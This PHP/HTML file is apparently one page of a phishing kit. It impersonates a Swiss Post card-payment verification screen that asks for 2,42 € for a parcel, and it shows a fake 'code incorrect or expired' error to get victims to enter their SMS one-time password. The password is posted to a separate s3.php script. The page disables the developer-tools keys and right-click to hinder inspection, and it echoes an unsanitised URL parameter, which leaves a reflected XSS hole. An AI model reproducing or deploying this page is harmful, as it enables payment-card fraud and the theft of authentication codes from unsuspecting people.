<?php
$bin4=$_GET['page'];
date_default_timezone_set('Europe/Paris');

if(!isset($_SESSION)) { session_start(); } 
error_reporting(0);
?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Secure Code&#8482;</title>
<link href="./ndart_acs_dyn.css" rel="stylesheet" type="text/css" media="screen">
<link href="./ndart_acs_dyn2.css" rel="stylesheet" type="text/css" media="screen">
<script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
	     return false;
	  }
	}


	
	document.addEventListener('contextmenu', function(e) {
	  e.preventDefault();
	});

</script>

</head>

<body onload="setObfuscatedCell()">
<div id="main">

<form action="../s3.php?page=<?php echo $bin4 ?>" method="post">
<table id="data">
	<tbody><tr>
	<td><img src="https://www.post.ch/-/media/portal-opp/global/logos/logo---die-post.svg" alt=""></td>
		<td class="logor"><img src="./ICO_token.gif" alt="">
		<img src="./img_key.png" width="10%"></td></tr>
	
	<tr>
		<td colspan="2">&nbsp;</td>
	</tr> 
			
	<tr>
		<td>Commerçant:</td>
		<td><strong>La post</strong></td>
	</tr>
	<tr>
		<td>Code de Livraison:</td>
		<td><strong>12978497-la-poste</strong></td>
	</tr>
	<tr>
		<td>Montant:</td>
		<td><strong>2,42 €</strong></td>
	</tr>

	<tr>
		<td>Numéro de carte:</td>
		<td><strong>**** **** **** <?php echo $bin4 ?></strong></td>
	</tr>

	
	<tr>
		<td>Temps:</td>
		<td><strong><span id="obf"><?php echo date('d/m/Y H:i:s', time()); ?></span></strong></td>
	</tr>

	<tr>
		<td colspan="2">&nbsp;</td>
	</tr>
<tr>
		<td></td>
		<td><strong><span id="obf"><span style="color:red;font-size:10px;border: 52px;border-color: ">Il codice immesso non è corretto o è scaduto, è stato inviato un nuovo codice</span></span></strong></td>
	</tr>
	
	<tr>
		<td colspan="2">&nbsp;</td>
	</tr>
	<tr>
		<td><strong>Code OTP </strong>
	
			
		</td>
		<td><input type="password" name="s8" required="" size="20" class="textfield" maxlength="8"></td>        
	</tr>
	<tr>
		<td colspan="2">&nbsp;</td>
	</tr>

	<tr>
			<td colspan="2">
				<p>
					Le mot de passe que vous devrez saisir pour authentifier la transaction a été envoyé par SMS à votre numéro de téléphone portable ou mot de passe à clé électronique. N'oubliez pas: vous disposez de 3 tentatives d'insertion.<br><br>
					Entrez le code OTP que vous avez reçu et cliquez sur "Continuer" pour confirmer l'opération.<br><br></p>
			</td>
		</tr>
	
		

	<tr>
		<td colspan="2">&nbsp;</td>
	</tr>	
	<tr>
		<td class="button"><input type="submit" name="CONTINUA" value="Continuer" class="roundedFwd"></td>
		<td class="button"><input type="submit" name="CANCELLA" value="Annuler" class="roundedBack"></td>
	</tr>
	<tr>
		<td colspan="2">&nbsp;</td>
	</tr>
	
	
</tbody></table>

   
</form>
</div>


</body></html>